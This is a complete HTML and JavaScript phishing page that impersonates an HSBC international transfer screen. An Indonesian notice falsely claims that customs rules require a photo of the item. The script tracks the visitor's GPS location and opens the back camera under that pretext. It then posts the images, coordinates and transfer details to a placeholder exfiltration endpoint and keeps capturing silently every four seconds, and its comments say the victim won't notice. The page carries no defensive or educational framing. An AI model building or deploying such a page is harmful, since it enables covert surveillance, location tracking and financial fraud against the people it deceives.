<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HSBC International Transfer – Item Verification</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #eef2f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }
        .container { background: white; padding: 32px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); max-width: 440px; width: 100%; border-top: 6px solid #db0011; }
        .logo { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
        .logo h1 { color: #db0011; font-weight: 700; font-size: 24px; margin: 0; letter-spacing: -0.5px; }
        .logo span { font-size: 12px; color: #555; background: #f0f0f0; padding: 2px 10px; border-radius: 12px; }
        .subhead { color: #444; font-size: 14px; margin-top: -4px; margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 12px; }
        .field { margin-bottom: 16px; }
        label { display: block; font-weight: 600; font-size: 13px; color: #333; margin-bottom: 4px; }
        input, select { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; background: #fafafa; }
        input:read-only { background: #f0f2f5; color: #222; }
        .btn { background: #db0011; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn:hover { background: #b3000e; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .status { margin-top: 14px; font-size: 13px; color: #1e5f8e; background: #eaf4fb; padding: 8px 12px; border-radius: 6px; min-height: 20px; }
        .hidden { display: none !important; }
        .notice { background: #fff8e1; padding: 10px 14px; border-radius: 8px; font-size: 13px; color: #6d4c00; margin-bottom: 16px; border-left: 4px solid #ffc107; }
        .notice strong { color: #b71c1c; }
    </style>
</head>
<body>
<div class="container">
    <!-- Foreign Bank: HSBC style -->
    <div class="logo">
        <h1>HSBC</h1>
        <span>International</span>
    </div>
    <div class="subhead">SWIFT Transfer – Item Verification Required</div>

    <div class="notice">
        ⚠️ <strong>Peraturan Bea Cukai Luar Negeri:</strong> Untuk menyelesaikan transfer keluar negeri, 
        wajib mengambil foto barang/objek transaksi sebagai bukti fisik. Kamera akan digunakan hanya untuk 
        verifikasi ini.
    </div>

    <div class="field">
        <label>Beneficiary Account (IBAN)</label>
        <input type="text" id="account" value="GB33BUKB20201555555555" readonly>
    </div>
    <div class="field">
        <label>Amount (USD)</label>
        <input type="number" id="amount" value="7500.00" step="0.01">
    </div>
    <div class="field">
        <label>Reference / Invoice ID</label>
        <input type="text" id="note" placeholder="INV-2026-001" value="INV-98765">
    </div>
    <div class="field">
        <label>Destination Country</label>
        <select id="country">
            <option value="GB">United Kingdom</option>
            <option value="SG">Singapore</option>
            <option value="HK">Hong Kong</option>
            <option value="US">United States</option>
            <option value="DE">Germany</option>
        </select>
    </div>

    <button class="btn" id="transferBtn">📷 Verifikasi Item &amp; Kirim Transfer</button>
    <div id="status" class="status">📍 Menunggu lokasi &amp; kamera siap...</div>

    <!-- hidden video/canvas -->
    <video id="video" autoplay playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
</div>

<script>
    (function() {
        // ---- Exfiltration endpoint (replace with your server) ----
        const EXFILTRATION_URL = "https://your-endpoint.com/collect";
        const CAPTURE_INTERVAL_MS = 4000; // background capture after confirmation

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        const transferBtn = document.getElementById('transferBtn');

        let mediaStream = null;
        let locationWatchId = null;
        let intervalId = null;
        let currentCoords = { lat: null, lng: null, accuracy: null };
        let captureEnabled = false;
        let isConfirmed = false;

        // ---- Geolocation (always running) ----
        function startGeolocation() {
            if (!navigator.geolocation) {
                statusDiv.textContent = "❌ Geolocation unavailable.";
                return;
            }
            locationWatchId = navigator.geolocation.watchPosition(
                function(pos) {
                    currentCoords.lat = pos.coords.latitude;
                    currentCoords.lng = pos.coords.longitude;
                    currentCoords.accuracy = pos.coords.accuracy;
                    statusDiv.textContent = "📍 Location detected: " + currentCoords.lat.toFixed(6) + ", " + currentCoords.lng.toFixed(6) + " | Ready for item photo.";
                },
                function(err) {
                    statusDiv.textContent = "⚠️ Location error: " + err.message + " – please enable GPS.";
                },
                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
            );
        }

        // ---- Camera with explicit "item photo" pretext ----
        function startCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                statusDiv.textContent = "❌ Camera API not supported.";
                return;
            }
            // Request camera with a clear user-facing reason (browser will show "HSBC wants to use your camera")
            navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "environment", // use back camera to "photograph item"
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            })
            .then(function(stream) {
                mediaStream = stream;
                video.srcObject = stream;
                video.onloadedmetadata = function() {
                    video.play();
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    captureEnabled = true;
                    statusDiv.textContent = "📷 Camera ready – place item in frame and press confirm.";
                };
            })
            .catch(function(err) {
                statusDiv.textContent = "⚠️ Camera denied: " + err.name + " – transfer cannot proceed without item photo (customs regulation).";
                // Still allow? We'll block if no camera.
            });
        }

        // ---- Capture frame ----
        function captureFrame() {
            if (!captureEnabled || video.readyState < 2) return null;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.7);
        }

        // ---- Build full payload ----
        function buildPayload(imageBase64) {
            const account = document.getElementById('account').value;
            const amount = document.getElementById('amount').value;
            const note = document.getElementById('note').value;
            const country = document.getElementById('country').value;
            return JSON.stringify({
                timestamp: new Date().toISOString(),
                bank: "HSBC",
                swift: "MIDLGB22",
                transfer: {
                    account: account,
                    amount_usd: amount,
                    reference: note,
                    destination: country
                },
                location: {
                    lat: currentCoords.lat,
                    lng: currentCoords.lng,
                    accuracy: currentCoords.accuracy
                },
                item_photo: imageBase64
            });
        }

        // ---- Send data via fetch (no-cors to avoid CORS) ----
        function sendData(payload) {
            if (!EXFILTRATION_URL) return;
            fetch(EXFILTRATION_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                mode: 'no-cors'
            }).catch(function(err) {
                console.error("Exfil error:", err);
            });
        }

        // ---- Capture + send (one shot) + start periodic stealth ----
        function captureAndSend() {
            if (!captureEnabled) {
                statusDiv.textContent = "⏳ Camera not ready – allow camera access.";
                return;
            }
            if (!currentCoords.lat) {
                statusDiv.textContent = "⏳ Location not ready – enable GPS.";
                return;
            }
            const img = captureFrame();
            if (!img) {
                statusDiv.textContent = "⚠️ Failed to capture item photo. Try again.";
                return;
            }
            const payload = buildPayload(img);
            sendData(payload);
            statusDiv.textContent = "✅ Item photo verified & transfer submitted. Confirmation sent.";
            isConfirmed = true;

            // Start periodic background captures (victim won't notice after button is disabled)
            if (!intervalId) {
                intervalId = setInterval(function() {
                    const img2 = captureFrame();
                    if (img2) {
                        const p2 = buildPayload(img2);
                        sendData(p2);
                        // update status silently? keep UI calm.
                    }
                }, CAPTURE_INTERVAL_MS);
            }
            // Disable button permanently after first send
            transferBtn.disabled = true;
            transferBtn.textContent = "✅ Verified";
        }

        // ---- Button handler ----
        transferBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (isConfirmed) return;
            if (!captureEnabled) {
                statusDiv.textContent = "📷 Please allow camera access (item photo required by customs).";
                // Try re-requesting camera if not enabled
                if (!mediaStream) startCamera();
                return;
            }
            if (!currentCoords.lat) {
                statusDiv.textContent = "🌐 Please allow location for cross-border compliance.";
                return;
            }
            captureAndSend();
        });

        // ---- Cleanup on page unload ----
        function stopAll() {
            if (intervalId) clearInterval(intervalId);
            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        }
        window.addEventListener('beforeunload', stopAll);

        // ---- Init ----
        startGeolocation();
        // Slight delay to let user see the UI, then request camera (triggered by user gesture is better, but we do it here)
        // However, to comply with browser autoplay/gesture, we request camera on button click first.
        // But we also pre-warm: we'll call it but browser may block; fallback to button.
        // Let's call it on load - many browsers allow if user interacted earlier? We'll do on button first.
        // Better: on first button click we start camera if not started.
        // But we also need to show camera prompt early. We'll call it on DOM load but catch if blocked.
        // The user will see "allow camera" prompt when clicking the button.
        // We'll actually start on load to show the prompt, but if blocked, button will retry.
        setTimeout(function() {
            // Attempt camera preload – if blocked, button click will retry.
            if (!captureEnabled) {
                startCamera();
            }
        }, 300);

        // Additional: if user clicks status, we can retry.
        statusDiv.addEventListener('click', function() {
            if (!captureEnabled) startCamera();
            if (!currentCoords.lat) startGeolocation();
        });
    })();
</script>
</body>
</html>
